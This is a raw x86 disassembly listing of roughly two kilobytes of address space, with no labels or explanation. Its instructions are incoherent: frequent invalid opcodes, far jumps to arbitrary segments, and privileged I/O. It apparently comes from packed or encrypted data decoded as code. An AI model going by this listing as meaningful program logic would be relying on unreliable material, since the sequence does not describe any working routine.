  4174ab:	jmp    0xe430:0x5fc45f9a
  4174b2:	jmp    0xd130:0xb3f14d03
  4174b9:	pop    ecx
  4174ba:	ss inc ebp
  4174bc:	es retf 
  4174be:	dec    ecx
  4174bf:	adc    al,0xaa
  4174c1:	add    ah,BYTE PTR ds:0x31ff30cc
  4174c7:	dec    eax
  4174c8:	pushf  
  4174c9:	mov    esp,0x2fd4cc33
  4174ce:	call   0xdf37:0xc5982af7
  4174d5:	jae    0x4174a3
  4174d7:	jno    0x41751f
  4174d9:	jecxz  0x417502
  4174db:	scas   al,BYTE PTR es:[edi]
  4174dc:	stos   DWORD PTR es:[edi],eax
  4174dd:	mov    esi,0xee345c53
  4174e2:	mov    dh,0xf5
  4174e4:	(bad)  
  4174e5:	cmp    eax,0x92f33c5e
  4174ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174eb:	mov    dl,0x6f
  4174ed:	sbb    eax,0xdec8ed87
  4174f2:	inc    eax
  4174f3:	loop   0x4174b4
  4174f5:	mov    bh,0x40
  4174f7:	add    BYTE PTR [esp+eax*4-0x22],dl
  4174fb:	shr    DWORD PTR [ebx-0x22d949a9],1
  417501:	jb     0x417490
  417503:	outs   dx,DWORD PTR ds:[esi]
  417504:	lods   eax,DWORD PTR ds:[esi]
  417505:	sub    DWORD PTR [edi-0x1a],esi
  417508:	inc    edi
  417509:	pop    edi
  41750a:	and    BYTE PTR [eax],bh
  41750c:	icebp  
  41750d:	dec    ecx
  41750e:	ror    BYTE PTR [esi+edx*8+0x488b1ed6],0x84
  417516:	mov    WORD PTR [ebx],ds
  417518:	or     cl,bl
  41751a:	call   0x638d5288
  41751f:	(bad)  
  417520:	mov    ebx,0xe336374
  417525:	(bad)  
  417526:	cwde   
  417527:	cmp    ebx,DWORD PTR [ebx]
  417529:	imul   ebx,DWORD PTR [eax],0xffffffb6
  41752c:	push   es
  41752d:	xchg   ecx,eax
  41752e:	jno    0x41755e
  417530:	pop    eax
  417531:	push   esp
  417532:	or     BYTE PTR [eax],dl
  417534:	inc    edi
  417535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417536:	cmp    ch,ch
  417538:	das    
  417539:	pop    ss
  41753a:	mov    ebx,0x750e9cc6
  41753f:	pop    ebp
  417540:	pop    edx
  417541:	sub    edi,DWORD PTR ds:0xc66c0a8f
  417547:	popa   
  417548:	out    dx,al
  417549:	push   ebp
  41754a:	loope  0x4175ba
  41754c:	mov    dh,0x37
  41754e:	add    BYTE PTR [esi-0x37],0xd6
  417552:	cwde   
  417553:	jmp    0x4175d4
  417555:	fsubr  DWORD PTR [edi]
  417557:	xor    edi,DWORD PTR [ecx]
  417559:	push   esi
  41755a:	clc    
  41755b:	inc    ebx
  41755c:	xchg   esi,eax
  41755d:	in     eax,0x57
  41755f:	jl     0x4175d1
  417561:	fmul   st(5),st
  417563:	imul   ebp,DWORD PTR ds:0x881a541a,0x9
  41756a:	pop    esi
  41756b:	xchg   DWORD PTR [eax+0x4418415d],esi
  417571:	or     cl,BYTE PTR ds:0xa1a855b5
  417577:	pop    esp
  417578:	jb     0x417531
  41757a:	push   ds
  41757b:	xchg   edx,eax
  41757c:	in     al,0xc
  41757e:	jmp    0xf70b:0x941303ec
  417585:	sub    DWORD PTR [esi+0x5e],esi
  417588:	call   0x1887:0x565efbe1
  41758f:	aas    
  417590:	push   edx
  417591:	sbb    dh,BYTE PTR cs:[ecx-0x53]
  417595:	cmc    
  417596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417597:	les    ebp,FWORD PTR [edx+0x54c0203b]
  41759d:	or     al,0xa4
  41759f:	inc    edi
  4175a0:	into   
  4175a1:	xor    eax,eax
  4175a3:	stos   DWORD PTR es:[edi],eax
  4175a4:	sbb    DWORD PTR [ebx],0xffffffb9
  4175a7:	or     bl,BYTE PTR [ebp+0x7a]
  4175aa:	jae    0x417629
  4175ac:	jmp    0x4175e3
  4175ae:	hlt    
  4175af:	mov    edi,0x9141d75c
  4175b4:	cmp    DWORD PTR [ecx-0x1d89cc27],ebp
  4175ba:	out    0x40,al
  4175bc:	leave  
  4175bd:	xchg   si,ax
  4175bf:	inc    edi
  4175c0:	sbb    al,0xf0
  4175c2:	lods   al,BYTE PTR ds:[esi]
  4175c3:	hlt    
  4175c4:	out    dx,al
  4175c5:	adc    BYTE PTR [ebx],cl
  4175c7:	ret    
  4175c8:	lock inc esi
  4175ca:	(bad)  
  4175cc:	leave  
  4175cd:	or     DWORD PTR [ebp+0x2ac0fb15],ebp
  4175d3:	mov    edi,0xea2285d6
  4175d8:	imul   BYTE PTR [esi-0x5e]
  4175db:	jge    0x4175f7
  4175dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175de:	cmp    dl,BYTE PTR [edi-0x643e9393]
  4175e4:	pop    ss
  4175e5:	pop    esp
  4175e6:	sbb    esp,DWORD PTR [ecx]
  4175e8:	mov    ch,0x2
  4175ea:	push   ebp
  4175eb:	out    0xbf,eax
  4175ed:	mov    ds:0x418961a0,eax
  4175f2:	aad    0x64
  4175f4:	jg     0x417617
  4175f6:	push   eax
  4175f7:	push   ecx
  4175f8:	push   ss
  4175f9:	pusha  
  4175fa:	mov    WORD PTR [ecx+ebp*8],cs
  4175fd:	xor    DWORD PTR [edi],0xffffff8c
  417600:	rol    BYTE PTR [ecx+0x5e47acc9],0xde
  417607:	(bad)  
  417608:	retf   
  417609:	arpl   WORD PTR [esi+0x586cf740],dx
  41760f:	or     cl,0x2c
  417612:	enter  0xbb27,0x29
  417616:	xchg   esp,eax
  417617:	sub    al,bl
  417619:	addr16 sti 
  41761b:	out    0x7,eax
  41761d:	stos   BYTE PTR es:[edi],al
  41761e:	shl    BYTE PTR [ebx],cl
  417620:	inc    ebx
  417621:	and    ebx,DWORD PTR [ecx]
  417623:	inc    eax
  417624:	pop    es
  417625:	adc    al,BYTE PTR [ebx-0x117060b3]
  41762b:	jns    0x4175df
  41762d:	data16 mov ds:0x77aa86df,al
  417633:	inc    edx
  417634:	repnz popa 
  417636:	ja     0x41764f
  417638:	sub    BYTE PTR [ecx-0xa02411d],bl
  41763e:	je     0x4176ae
  417640:	ins    BYTE PTR es:[edi],dx
  417641:	retf   
  417642:	pusha  
  417643:	repnz mov ch,0x44
  417646:	jns    0x417662
  417648:	xchg   ecx,eax
  417649:	out    dx,al
  41764a:	inc    eax
  41764b:	ja     0x4176b7
  41764d:	or     DWORD PTR [edi],0xffffffb4
  417650:	lock xor al,0x18
  417653:	xor    al,0x86
  417655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417656:	jae    0x907a995a
  41765c:	xor    DWORD PTR [edi-0x1c],0xb865ed07
  417663:	add    al,0xd6
  417665:	jg     0x417622
  417667:	xchg   ebx,eax
  417668:	fwait
  417669:	sub    bh,BYTE PTR [edi+ecx*4]
  41766c:	les    ebp,FWORD PTR [ebp-0x1]
  41766f:	mov    edx,DWORD PTR [edx]
  417671:	cmc    
  417672:	mov    DWORD PTR [esi-0x5d],ebx
  417675:	hlt    
  417676:	ret    
  417677:	fimul  WORD PTR [eax]
  417679:	pop    ss
  41767a:	sub    ecx,DWORD PTR [esi-0x33f5fbe4]
  417680:	or     eax,0xc12e83e7
  417685:	scas   eax,DWORD PTR es:[edi]
  417686:	push   es
  417687:	add    al,0xd0
  417689:	sub    esi,DWORD PTR [ebx+edi*1-0x75]
  41768d:	sub    ah,BYTE PTR [ecx-0x3246d7ed]
  417693:	jecxz  0x41766a
  417695:	jge    0x417636
  417697:	loopne 0x4176cf
  417699:	sub    DWORD PTR [ecx-0x6c],ebp
  41769c:	mov    eax,0xf36f8c0a
  4176a1:	dec    ebx
  4176a2:	push   ss
  4176a3:	data16 rol BYTE PTR [edi],cl
  4176a6:	jge    0x417676
  4176a8:	add    al,0x1e
  4176aa:	popf   
  4176ab:	rcl    DWORD PTR [ecx],0x8f
  4176ae:	pop    ebp
  4176af:	outs   dx,DWORD PTR ds:[esi]
  4176b0:	pop    edx
  4176b1:	pop    eax
  4176b2:	xchg   esp,eax
  4176b3:	inc    eax
  4176b4:	nop
  4176b5:	data16 ja 0x4176a1
  4176b8:	sahf   
  4176b9:	pop    ss
  4176ba:	not    edx
  4176bc:	clc    
  4176bd:	dec    ecx
  4176be:	test   DWORD PTR [edi-0x30],ebp
  4176c1:	pop    ds
  4176c2:	jo     0x417684
  4176c4:	xlat   BYTE PTR ds:[ebx]
  4176c5:	mov    bl,0x87
  4176c7:	jne    0x417748
  4176c9:	out    0xa0,eax
  4176cb:	(bad)  
  4176cc:	sbb    esp,DWORD PTR [edx]
  4176ce:	sbb    esp,DWORD PTR [esi-0x18]
  4176d1:	in     al,0x0
  4176d3:	or     ch,BYTE PTR [ecx-0x3f]
  4176d6:	int    0xd4
  4176d8:	jle    0x41769b
  4176da:	inc    edx
  4176db:	stc    
  4176dc:	push   0xb48c8f4f
  4176e1:	cmp    al,0x94
  4176e3:	mov    ds:0x50184064,eax
  4176e8:	xchg   esp,eax
  4176e9:	ins    DWORD PTR es:[edi],dx
  4176ea:	push   0xffffffc2
  4176ec:	mov    ebp,0xf8643ab8
  4176f1:	or     al,0xec
  4176f3:	scas   al,BYTE PTR es:[edi]
  4176f4:	mov    bh,0x2
  4176f6:	stos   BYTE PTR es:[edi],al
  4176f7:	add    eax,0xf3d86857
  4176fc:	add    edx,DWORD PTR [esp+edi*2-0x36ea1c04]
  417703:	(bad)  
  417704:	lahf   
  417705:	xchg   ecx,eax
  417706:	aad    0x82
  417708:	jns    0x41771a
  41770a:	adc    eax,0xfea350fc
  41770f:	jl     0x4176c7
  417711:	fidiv  WORD PTR [ebp-0x4b]
  417714:	xchg   edx,eax
  417715:	aam    0xb6
  417717:	pop    edx
  417718:	retf   
  417719:	pop    edx
  41771a:	or     BYTE PTR [ebx-0x34ee36e7],bl
  417720:	arpl   sp,cx
  417722:	mov    eax,ds:0x8ad55798
  417727:	les    eax,FWORD PTR ds:0x5272ac60
  41772d:	sbb    DWORD PTR [edx+0x78809013],ecx
  417733:	jnp    0x4177a5
  417735:	(bad)  
  417736:	lods   eax,DWORD PTR ds:[esi]
  417737:	lods   al,BYTE PTR ds:[esi]
  417738:	push   0xeddfb4e2
  41773d:	stc    
  41773e:	jg     0x417764
  417740:	sbb    ebp,ebx
  417742:	call   0x82f50748
  417747:	sub    BYTE PTR [esi+0x9414772],0x2c
  41774e:	je     0x4177c2
  417750:	push   es
  417751:	inc    eax
  417752:	int    0x0
  417754:	jle    0x41773d
  417756:	push   ds
  417757:	bound  ecx,QWORD PTR [edx]
  417759:	adc    al,0xe8
  41775b:	bound  ebp,QWORD PTR [esi+0x9]
  41775e:	popf   
  41775f:	addr16 cmp eax,0x3f5e4007
  417765:	adc    eax,0xaa7b1160
  41776a:	xor    al,0x3e
  41776c:	sbb    bl,0x3e
  41776f:	test   esi,0xb177355e
  417775:	idiv   BYTE PTR [ebp+0x6ae96d8e]
  41777b:	mov    edi,0x55283008
  417780:	pushf  
  417781:	add    ch,BYTE PTR [edi+0x5e]
  417784:	addr16 in al,0x2e
  417787:	cli    
  417788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417789:	ret    0xa9fc
  41778c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41778d:	fsubr  DWORD PTR [esi-0x2e171a5e]
  417793:	mov    al,ds:0x9181f54b
  417798:	in     al,0x96
  41779a:	cvtdq2ps xmm4,xmm3
  41779d:	fisttp QWORD PTR [ecx+0x7512850d]
  4177a3:	jae    0x4177cf
  4177a5:	pop    ds
  4177a6:	and    eax,0x13991e4
  4177ab:	and    al,0x5d
  4177ad:	xor    DWORD PTR [ebx],edx
  4177af:	mov    al,ds:0x3b786982
  4177b4:	popf   
  4177b5:	fbstp  TBYTE PTR [eax-0x39eba0d5]
  4177bb:	xchg   edi,eax
  4177bc:	test   eax,0xe67f67eb
  4177c1:	add    BYTE PTR [eax-0x8f85dbd],bl
  4177c7:	adc    eax,0xf3d23b73
  4177cc:	fistp  QWORD PTR [esi+0x13]
  4177cf:	xor    cl,BYTE PTR [ebp+0x78]
  4177d2:	and    eax,0x85d17d4a
  4177d7:	aam    0x6f
  4177d9:	(bad)  
  4177da:	push   ds
  4177db:	push   edx
  4177dc:	loop   0x417792
  4177de:	leave  
  4177df:	lea    esi,[edx-0x1719b2d6]
  4177e5:	rcr    DWORD PTR [ecx-0x39],1
  4177e8:	xor    eax,0xb3e0ab53
  4177ed:	mov    eax,ds:0xc80a65a7
  4177f2:	out    0x3f,al
  4177f4:	pop    ebx
  4177f5:	xchg   DWORD PTR ds:0x3ac2f1f7,esp
  4177fb:	shl    DWORD PTR [esi+0xb],1
  4177fe:	popf   
  4177ff:	mov    ebp,0x38af6ce2
  417804:	sub    edx,DWORD PTR [esi]
  417806:	ror    BYTE PTR [edi-0x44234f72],cl
  41780c:	pop    edx
  41780d:	pop    es
  41780e:	mov    ebx,0xbff55137
  417813:	mov    edi,0xa7d1b8df
  417818:	fs das 
  41781a:	call   0x10157be0
  41781f:	bound  ecx,QWORD PTR [ebx+0x5f]
  417822:	jge    0x4177f3
  417824:	imul   DWORD PTR [esi-0x52]
  417827:	jo     0x417868
  417829:	inc    esi
  41782a:	fadd   DWORD PTR [esi+esi*2+0x5f0a76d5]
  417831:	pop    ecx
  417832:	sub    ebx,DWORD PTR [edx-0x2a]
  417835:	rcr    bl,0xb3
  417838:	or     eax,0x46b00b8d
  41783d:	jnp    0x4178b4
  41783f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417840:	in     al,dx
  417841:	dec    eax
  417842:	es xchg ecx,eax
  417844:	repnz inc ebx
  417846:	faddp  st(7),st
  417848:	(bad)  
  417849:	sub    DWORD PTR [ecx],eax
  41784b:	inc    esi
  41784c:	cmp    eax,0xea2efa3d
  417851:	xor    DWORD PTR [edx],ebx
  417853:	cdq    
  417854:	xchg   esp,ebp
  417856:	sub    al,0x4b
  417858:	in     al,dx
  417859:	fcomp  DWORD PTR [edx+0x79]
  41785c:	jnp    0x417803
  41785e:	aaa    
  41785f:	and    eax,0x57de1a2c
  417864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417865:	bound  ecx,QWORD PTR [eax-0x2a]
  417868:	ins    BYTE PTR es:[edi],dx
  417869:	sbb    DWORD PTR [ebx],ecx
  41786b:	out    0x73,eax
  41786d:	or     al,0x49
  41786f:	pushf  
  417870:	leave  
  417871:	rol    ebp,1
  417873:	rcl    DWORD PTR [ecx+0x34],cl
  417876:	rol    DWORD PTR [ebx-0x513e5a55],cl
  41787c:	push   0xb3eef261
  417881:	sbb    ebp,ecx
  417883:	ins    DWORD PTR es:[edi],dx
  417884:	xor    al,0x60
  417886:	addr16 mov edx,0x959c66d4
  41788c:	and    al,0x84
  41788e:	rol    DWORD PTR [eax-0x29],1
  417891:	dec    esp
  417892:	dec    ebp
  417893:	mov    cl,0x90
  417895:	pusha  
  417896:	xlat   BYTE PTR ds:[ebx]
  417897:	lods   al,BYTE PTR ds:[esi]
  417898:	ss data16 stc 
  41789b:	sar    BYTE PTR [edx],1
  41789d:	inc    esp
  41789e:	je     0x4178a3
  4178a0:	dec    edx
  4178a1:	jnp    0x4178d1
  4178a3:	adc    bl,BYTE PTR [ebx+0x10c55b46]
  4178a9:	retf   0x9d45
  4178ac:	sub    BYTE PTR [eax+0x23],ch
  4178af:	mov    cl,BYTE PTR [ebp+eiz*8+0x309a097d]
  4178b6:	and    eax,0xced1a043
  4178bb:	mov    dh,0xd
  4178bd:	je     0x4178c3
  4178bf:	mov    ecx,0xfd57e516
  4178c4:	xchg   ebx,eax
  4178c5:	jns    0x41790f
  4178c7:	push   es
  4178c8:	mov    ebx,0xfd5462d8
  4178cd:	push   edx
  4178ce:	inc    esi
  4178cf:	ss (bad) 
  4178d2:	sbb    cl,BYTE PTR [edx]
  4178d4:	lock mov ah,0xe
  4178d7:	es push ebx
  4178d9:	pop    ecx
  4178da:	dec    ebx
  4178db:	ins    DWORD PTR es:[edi],dx
  4178dc:	idiv   DWORD PTR [ebx+0xb]
  4178df:	sub    DWORD PTR [esi],0x22
  4178e2:	into   
  4178e3:	xchg   DWORD PTR [esi-0x3b8c9791],ebp
  4178e9:	stc    
  4178ea:	cli    
  4178eb:	cwde   
  4178ec:	mov    esp,0x5b76d88c
  4178f1:	xor    bl,BYTE PTR [eax-0x1fea45c]
  4178f7:	int3   
  4178f8:	mov    bl,0x2f
  4178fa:	repz shl BYTE PTR [esi+ebx*4+0x3d],cl
  4178ff:	fld    QWORD PTR [edx+ebx*4+0x3a875364]
  417906:	cld    
  417907:	aam    0x74
  417909:	neg    DWORD PTR [ebp+0x1e]
  41790c:	pop    edi
  41790d:	popa   
  41790e:	sbb    al,0x37
  417910:	dec    ecx
  417911:	lods   eax,DWORD PTR ds:[esi]
  417912:	or     eax,0x2db89ba7
  417917:	fild   QWORD PTR [esi]
  417919:	mov    BYTE PTR [eax+0x3e],0x4
  41791d:	dec    eax
  41791e:	dec    edi
  41791f:	sbb    BYTE PTR ds:0x28315568,ch
  417925:	pop    esp
  417926:	or     al,BYTE PTR [ebp+0x2475bd9a]
  41792c:	out    0x78,al
  41792e:	mov    ebx,0x2ce76207
  417933:	sub    DWORD PTR [eax],eax
  417935:	lods   eax,DWORD PTR ds:[esi]
  417936:	pop    ebx
  417937:	stos   BYTE PTR es:[edi],al
  417938:	je     0x4178f4
  41793a:	dec    eax
  41793b:	(bad)  
  41793c:	xchg   edi,eax
  41793d:	ror    DWORD PTR [ebx+0x46],1
  417940:	mov    al,ds:0xdec9693
  417945:	sub    bh,ah
  417947:	xor    edi,DWORD PTR ds:0xd1af352e
  41794d:	lods   al,BYTE PTR ds:[esi]
  41794e:	inc    ebx
  41794f:	push   edx
  417950:	jmp    0x417989
  417952:	add    edi,DWORD PTR [ecx+0xd47c9fe]
  417958:	mov    ebx,0xcb8c7b2e
  41795d:	jae    0x4179bd
  41795f:	ret    
  417960:	cwde   
  417961:	sub    bl,cl
  417963:	pop    es
  417964:	sub    ah,dh
  417966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417967:	pop    esi
  417968:	stc    
  417969:	inc    edx
  41796a:	in     al,dx
  41796b:	mov    cl,BYTE PTR [eax+esi*4]
  41796e:	test   al,0x1a
  417970:	js     0x41790b
  417972:	mov    cl,0x37
  417974:	sub    al,0x3b
  417976:	xchg   edi,eax
  417977:	or     eax,0x31955a8
  41797c:	jb     0x417969
  41797e:	add    ebp,DWORD PTR ss:[edx+0x1fc40991]
  417985:	push   edi
  417986:	adc    bl,0x71
  417989:	in     al,0x8f
  41798b:	push   0xfbef1aca
  417990:	leave  
  417991:	jmp    0x453c:0x71e143a0
  417998:	shl    esi,cl
  41799a:	pop    esp
  41799b:	add    al,0x25
  41799d:	ficomp WORD PTR [esi]
  41799f:	sbb    esi,DWORD PTR [edi+eax*1]
  4179a2:	cmp    eax,0xf491d0a7
  4179a7:	sbb    ebx,ebx
  4179a9:	popa   
  4179aa:	cwde   
  4179ab:	cmp    eax,0x804bdb6c
  4179b0:	clc    
  4179b1:	test   al,0xb9
  4179b3:	adc    ebp,ebx
  4179b5:	pop    esi
  4179b6:	jle    0x4179d3
  4179b8:	sbb    al,0xea
  4179ba:	or     ebp,DWORD PTR [eax-0x58abe5de]
  4179c0:	cs in  al,0xdd
  4179c3:	cmp    ecx,edi
  4179c5:	addr16 mov eax,0x67c92ee4
  4179cb:	aas    
  4179cc:	inc    edi
  4179cd:	pop    es
  4179ce:	or     esi,eax
  4179d0:	and    BYTE PTR [ecx],bh
  4179d2:	adc    BYTE PTR [edi-0x64f60479],0x3
  4179d9:	mov    eax,0x9c1bb2aa
  4179de:	into   
  4179df:	jbe    0x4179be
  4179e1:	pop    edi
  4179e2:	stos   DWORD PTR es:[edi],eax
  4179e3:	jmp    0x5f4994d4
  4179e8:	jle    0x417988
  4179ea:	push   0x37
  4179ec:	ss pop ss
  4179ee:	ss mov al,0x59
  4179f1:	pop    ebx
  4179f2:	mov    ds:0x9f90b561,eax
  4179f7:	pop    edi
  4179f8:	sub    al,0x17
  4179fa:	or     esi,DWORD PTR [ebx-0x290d166f]
  417a00:	leave  
  417a01:	add    esp,DWORD PTR [ecx+edi*4-0x1cb2af09]
  417a08:	shr    DWORD PTR [esi-0x18],0xe5
  417a0c:	mov    eax,0xc83c7d01
  417a11:	mov    dl,0xab
  417a13:	xor    edx,DWORD PTR [ecx+edi*8+0x22a37ccd]
  417a1a:	cmp    dl,BYTE PTR [ebp+0x19]
  417a1d:	xchg   edx,eax
  417a1e:	int3   
  417a1f:	mov    esp,0x7789c000
  417a24:	dec    esp
  417a25:	jmp    0x417aa0
  417a27:	fucomp st(6)
  417a29:	push   esp
  417a2a:	jne    0x417a46
  417a2c:	aas    
  417a2d:	push   ds
  417a2e:	lds    ebp,FWORD PTR [ecx+0x56]
  417a31:	std    
  417a32:	into   
  417a33:	pop    eax
  417a34:	out    dx,eax
  417a35:	aaa    
  417a36:	xchg   esi,eax
  417a37:	push   edx
  417a38:	in     eax,dx
  417a39:	adc    bh,BYTE PTR [ebx+0x67]
  417a3c:	cld    
  417a3d:	js     0x4179f6
  417a3f:	call   DWORD PTR [esi-0x5a5af9ad]
  417a45:	fcomi  st,st(2)
  417a47:	mov    ds:0x8f8f8daf,al
  417a4c:	inc    esp
  417a4d:	mov    eax,0x353160a3
  417a52:	fs mov esp,0xc503f7ab
  417a58:	inc    edi
  417a59:	xchg   BYTE PTR [ecx-0x2a],dh
  417a5c:	(bad)  
  417a5e:	(bad)  
  417a5f:	mov    al,ds:0xd6eb15e5
  417a64:	cdq    
  417a65:	fbld   TBYTE PTR [ecx]
  417a67:	imul   esp,DWORD PTR [esi+ecx*4-0x6e8b31f9],0x67
  417a6f:	jne    0x417a0c
  417a71:	rcr    DWORD PTR [edi],1
  417a73:	in     al,dx
  417a74:	jne    0x417acf
  417a76:	in     al,0x41
  417a78:	mov    al,ds:0x3bdf5bab
  417a7d:	fs adc esi,eax
  417a80:	sub    al,0x13
  417a82:	pop    esi
  417a83:	ror    DWORD PTR ds:0x6c06283,cl
  417a89:	cld    
  417a8a:	dec    edx
  417a8b:	mov    esi,0xec3165d5
  417a90:	xor    DWORD PTR [ecx+edi*1],0xffffff95
  417a94:	jl     0x417aa7
  417a96:	ins    DWORD PTR es:[edi],dx
  417a97:	lods   eax,DWORD PTR ds:[esi]
  417a98:	test   BYTE PTR [esi+0xd],dl
  417a9b:	push   cs
  417a9c:	or     eax,0x2b6d2696
  417aa1:	jl     0x417a8c
  417aa3:	push   esi
  417aa4:	hlt    
  417aa5:	push   0xffffffd3
  417aa7:	ins    DWORD PTR es:[edi],dx
  417aa8:	shl    DWORD PTR [ebx+ebx*1-0x24],0x94
  417aad:	fdivr  DWORD PTR [esi+0x30]
  417ab0:	ret    0x652b
  417ab3:	(bad)  
  417ab4:	fnclex 
  417ab6:	jp     0x417a6e
  417ab8:	es push 0x6ce5108b
  417abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417abf:	repnz push 0xffffffd1
  417ac2:	or     DWORD PTR [esi],edx
  417ac4:	cmc    
  417ac5:	es inc eax
  417ac7:	dec    ebx
  417ac8:	std    
  417ac9:	out    0x69,eax
  417acb:	jl     0x417abf
  417acd:	cmp    ecx,eax
  417acf:	jno    0x417ab8
  417ad1:	push   ebp
  417ad2:	(bad)  
  417ad3:	(bad)  
  417ad4:	xor    cl,BYTE PTR [ebp-0x1c]
  417ad7:	and    eax,DWORD PTR [ecx+eiz*2+0x2acc54d5]
  417ade:	es test eax,0xb5f2472
  417ae4:	in     al,dx
  417ae5:	mov    ebp,0xf12c4411
  417aea:	test   BYTE PTR [ebp-0x3b7ec1e],al
  417af0:	aaa    
  417af1:	pushf  
  417af2:	lods   eax,DWORD PTR ds:[esi]
  417af3:	pop    es
  417af4:	sbb    eax,0xb5234500
  417af9:	cmp    eax,0xc41a1d1f
  417afe:	cld    
  417aff:	shr    ah,0xaf
  417b02:	fadd   st,st(4)
  417b04:	fldcw  WORD PTR [edi]
  417b06:	mov    al,ds:0xce6dc1d7
  417b0b:	into   
  417b0c:	ds call 0x7c865476
  417b12:	dec    ebx
  417b13:	gs sti 
  417b15:	or     eax,ebx
  417b17:	xor    bh,ch
  417b19:	sbb    DWORD PTR [ecx-0x30712155],edi
  417b1f:	dec    eax
  417b20:	pmulhuw mm5,QWORD PTR [edx+0x10]
  417b24:	cmc    
  417b25:	or     eax,0x66afd1b3
  417b2a:	inc    eax
  417b2b:	mov    edx,0xf44b16d3
  417b30:	cld    
  417b31:	cmp    esi,esp
  417b33:	aas    
  417b34:	pushf  
  417b35:	dec    ecx
  417b36:	sbb    al,0xdd
  417b38:	push   ebp
  417b39:	dec    ebp
  417b3a:	popf   
  417b3b:	mul    dl
  417b3d:	adc    dl,BYTE PTR [edi+0x767216c3]
  417b43:	mov    eax,0x98236bd9
  417b48:	inc    ecx
  417b49:	dec    ecx
  417b4a:	ja     0x417acc
  417b4c:	xor    al,0x4f
  417b4e:	mov    edx,0xa07652f0
  417b53:	test   eax,0x7c141b27
  417b58:	cmp    edi,ecx
  417b5a:	mov    eax,ds:0xb886eb7
  417b5f:	fisttp QWORD PTR [esi-0x42]
  417b62:	dec    esp
  417b63:	cmp    DWORD PTR [ecx],esp
  417b65:	lea    eax,[edi+0x42c6f614]
  417b6b:	cmc    
  417b6c:	pop    esp
  417b6d:	pop    ebp
  417b6e:	mov    eax,ds:0xb557dff5
  417b73:	or     DWORD PTR [ecx+0x487a67f5],0x9bed642b
  417b7d:	and    BYTE PTR [ecx*1+0x4f999871],ah
  417b84:	jno    0x417b25
  417b86:	and    BYTE PTR [edi-0x174edc44],ah
  417b8c:	mov    al,0x11
  417b8e:	scas   al,BYTE PTR es:[edi]
  417b8f:	scas   eax,DWORD PTR es:[edi]
  417b90:	xchg   ecx,eax
  417b91:	dec    edi
  417b92:	xchg   esp,eax
  417b93:	loop   0x417ba5
  417b95:	rcl    ch,1
  417b97:	(bad)  
  417b98:	or     BYTE PTR [ebx-0x785431de],bh
  417b9e:	outs   dx,BYTE PTR ds:[esi]
  417b9f:	scas   al,BYTE PTR es:[edi]
  417ba0:	pop    edx
  417ba1:	clc    
  417ba2:	test   al,0x1
  417ba4:	adc    eax,0x251d2382
  417ba9:	or     ecx,ebp
  417bab:	inc    esp
  417bac:	push   esp
  417bad:	inc    esp
  417bae:	stos   DWORD PTR es:[edi],eax
  417baf:	cdq    
  417bb0:	dec    ecx
  417bb1:	loop   0x417b91
  417bb3:	stos   BYTE PTR es:[edi],al
  417bb4:	pop    es
  417bb5:	pop    esp
  417bb6:	icebp  
  417bb7:	pop    es
  417bb8:	mov    al,0x84
  417bba:	cdq    
  417bbb:	lahf   
  417bbc:	out    dx,al
  417bbd:	mov    edx,DWORD PTR [ebp-0x50]
  417bc0:	pop    ds
  417bc1:	mov    edi,0xc7313286
  417bc6:	daa    
  417bc7:	icebp  
  417bc8:	xchg   esp,eax
  417bc9:	out    dx,eax
  417bca:	test   BYTE PTR [esi-0x168391df],dl
  417bd0:	pusha  
  417bd1:	push   edi
  417bd2:	mov    eax,DWORD PTR [eax+0x3d]
  417bd5:	repz mov ebp,0xb48b4666
  417bdb:	in     eax,0x44
  417bdd:	mov    edx,0x9207c348
  417be2:	inc    edx
  417be3:	rcl    cl,1
  417be5:	rcr    BYTE PTR [edi-0x3ff1ff59],cl
  417beb:	xor    edx,DWORD PTR [ecx+0x32]
  417bee:	ficom  WORD PTR [edi+edi*8-0x45fde150]
  417bf5:	pushf  
  417bf6:	cmp    DWORD PTR [eax-0x7c],edi
  417bf9:	jns    0x417c57
  417bfb:	sbb    eax,0xf842847b
  417c00:	sbb    dh,BYTE PTR [ebp+0x16]
  417c03:	add    al,0xbd
  417c05:	pop    ecx
  417c06:	stc    
  417c07:	out    0x81,al
  417c09:	mov    bh,0x4d
  417c0b:	mov    eax,ds:0xe70eda61
  417c10:	mov    ah,0x4e
  417c12:	cs jnp 0x417c7a
  417c15:	call   0x2e36:0xf041f5a3
  417c1c:	out    dx,al
  417c1d:	pushf  
  417c1e:	out    dx,eax
  417c1f:	sbb    esi,0x1237473
  417c25:	imul   ecx,DWORD PTR [edx-0x24274973],0x1
  417c2c:	add    BYTE PTR [esi+0x6c],cl
  417c2f:	frstor [eax-0x4762d063]
  417c35:	jo     0x417c97
  417c37:	pop    edi
  417c38:	lds    esi,FWORD PTR [eax+0x234e7d6f]
  417c3e:	and    eax,0x699f65c3
  417c43:	sbb    eax,0x144b9848
  417c48:	sbb    eax,0xc579ab6
  417c4d:	add    dh,al
  417c4f:	pop    es
  417c50:	sub    eax,0xcb6a3562
  417c55:	mov    bl,0x69
  417c57:	out    dx,eax
  417c58:	das    
  417c59:	(bad)  
  417c5a:	push   esi
  417c5b:	mov    ch,ch
  417c5d:	fcomp  DWORD PTR [esi-0x35015e77]
  417c63:	push   0x56
  417c65:	minps  xmm5,XMMWORD PTR [edx-0x67]
  417c69:	adc    esi,esi
  417c6b:	cmp    eax,0xdf1be079
  417c70:	pop    esp
  417c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c72:	mov    eax,ds:0xb7262e67
  417c77:	ret    
  417c78:	daa    
  417c79:	xchg   ebx,eax
  417c7a:	hlt    
  417c7b:	lods   al,BYTE PTR ds:[esi]
  417c7c:	pop    ss
  417c7d:	in     al,dx
  417c7e:	xchg   esi,eax
  417c7f:	jns    0x417c0e
  417c81:	dec    ebp
  417c82:	sub    BYTE PTR [ebx+0x71],dl
  417c85:	jne    0x417c2f
  417c87:	push   ecx
  417c88:	push   esi
